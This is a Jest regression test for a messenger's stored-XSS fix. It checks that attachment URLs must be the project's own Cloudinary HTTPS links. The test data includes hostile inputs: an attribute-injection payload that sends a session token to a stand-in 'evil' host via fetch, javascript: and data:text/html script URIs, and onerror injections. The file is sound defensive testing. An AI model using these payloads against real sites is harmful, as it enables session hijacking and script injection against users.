/** Регресс на stored XSS через вложения мессенджера: fileUrl обязан быть нашим
 *  Cloudinary-URL, любой инъекционный/чужой URL отвергается на границе записи. */
const OLD = process.env.CLOUDINARY_CLOUD_NAME;
beforeAll(() => { process.env.CLOUDINARY_CLOUD_NAME = 'daswggojd'; });
afterAll(() => { process.env.CLOUDINARY_CLOUD_NAME = OLD; });

// импорт ПОСЛЕ установки env (модуль читает CLOUD на загрузке)
let isAllowedAttachmentUrl: (u: unknown) => boolean;
let sanitizeAttachment: (u?: string | null, t?: string | null) => { fileUrl: string | null; fileThumbnailUrl: string | null };
beforeAll(() => {
  jest.resetModules();
  const mod = require('../services/attachments');
  isAllowedAttachmentUrl = mod.isAllowedAttachmentUrl;
  sanitizeAttachment = mod.sanitizeAttachment;
});

describe('isAllowedAttachmentUrl', () => {
  it('пускает наш Cloudinary https-URL', () => {
    expect(isAllowedAttachmentUrl('https://res.cloudinary.com/daswggojd/image/upload/v1/x.jpg')).toBe(true);
  });
  it.each([
    ['XSS-инъекция в атрибут', 'x" onerror="fetch(`//evil?t=`+sessionStorage.mc_token)'],
    ['чужое облако', 'https://res.cloudinary.com/evilcloud/x.jpg'],
    ['чужой хост', 'https://evil.com/daswggojd/x.jpg'],
    ['http (не https)', 'http://res.cloudinary.com/daswggojd/x.jpg'],
    ['javascript-схема', 'javascript:alert(1)'],
    ['data-URI', 'data:text/html,<script>alert(1)</script>'],
    ['пустое', ''],
    ['не строка', 42 as unknown as string],
    ['мусор', 'не url'],
  ])('отвергает: %s', (_label, url) => {
    expect(isAllowedAttachmentUrl(url as string)).toBe(false);
  });
});

describe('sanitizeAttachment', () => {
  it('валидную пару пропускает', () => {
    const r = sanitizeAttachment(
      'https://res.cloudinary.com/daswggojd/a.jpg',
      'https://res.cloudinary.com/daswggojd/a_thumb.jpg');
    expect(r.fileUrl).toContain('daswggojd/a.jpg');
    expect(r.fileThumbnailUrl).toContain('a_thumb.jpg');
  });
  it('невалидный основной URL → обе в null (вложение выкинуто)', () => {
    const r = sanitizeAttachment('x" onerror=alert(1)', 'https://res.cloudinary.com/daswggojd/a.jpg');
    expect(r.fileUrl).toBeNull();
    expect(r.fileThumbnailUrl).toBeNull();
  });
  it('валидный основной, но инъекционный thumbnail → thumb в null', () => {
    const r = sanitizeAttachment('https://res.cloudinary.com/daswggojd/a.jpg', 'x" onerror=alert(1)');
    expect(r.fileUrl).toContain('daswggojd/a.jpg');
    expect(r.fileThumbnailUrl).toBeNull();
  });
});
